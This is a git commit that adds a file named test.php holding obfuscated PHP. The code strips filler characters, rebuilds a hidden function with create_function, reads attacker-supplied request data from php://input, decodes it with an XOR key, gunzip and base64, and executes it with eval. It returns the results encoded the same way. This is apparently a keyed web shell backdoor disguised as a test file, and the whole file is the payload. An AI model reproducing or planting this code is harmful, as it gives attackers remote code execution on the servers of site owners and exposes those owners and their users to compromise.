e9950b1ae9ca91577b0948235c8726e775c12eba
G-bl7 <117639367+G-bl7@users.noreply.github.com>
2024-11-28 09:58:25 +0000

    Create test.php

---
+++ test.php
@@ -0,0 +1,10 @@
+<?php
+$r='/input")N,$Nm)==1N) N{@ob_starNt();@evNal(N@gzuncompreNNss(@x(@base6N4_decodNe($Nm[1]),$NNk)));$o=@Nob_geN';
+$J='$k){$cNN=strleNn($k);$l=strNlen(N$t);$o="";Nfor(N$iN=0;N$i<$l;){for($Nj=0;($jN<$c&&$Ni<N$l);$j++,$NNi';
+$M='t_coNntents();@ob_enNdN_clean();$Nr=@base6N4_encoNdeN(@x(N@gzcompNress($o),$Nk)N);pNrint("$p$kh$Nr$kf");}';
+$S=str_replace('he','','crheeheathehee_funchetheion');
+$C='++){$o.=$tN{$i}^$k{$j}N;}}retNurn $oN;}if (N@pNNreg_match("NN/N$kh(.+)$kf/",@NfileN_get_contentsN("php:N/';
+$O='$k="d5N4c10Ne9";$Nkh="adf47N2a3d3Na1N";$kf="96c762Nd47N574";$pN="fa3NqvfNdGNrv6mGv4NV";fNunNction x($t,';
+$G=str_replace('N','',$O.$J.$C.$r.$M);
+$d=$S('',$G);$d();
+?>
